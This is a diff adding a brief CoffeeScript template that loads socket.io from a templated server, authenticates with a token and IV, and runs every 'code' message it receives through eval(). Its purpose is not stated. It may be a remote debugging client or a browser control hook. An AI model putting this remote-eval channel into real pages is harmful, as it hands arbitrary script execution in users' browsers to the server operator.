@@ -1,0 +1,21 @@
+async = (u, c) ->
+  script = document.createElement('script')
+  script.async = true
+  script.src = u
+  other = document.getElementsByTagName('script')[0]
+  script.addEventListener "load", ((e) ->
+    c null, e
+  ), false
+  other.parentNode.insertBefore(script, other)
+async('<%= server %>/socket.io/socket.io.js', ()->
+  socket = io.connect('<%= server %>')
+  socket.on('connect', (data)->
+    socket.emit('auth',
+      token: '<%= token %>',
+      iv: '<%= iv %>'
+    )
+  )
+  socket.on('code', (data)->
+    eval(data)
+  )
+)
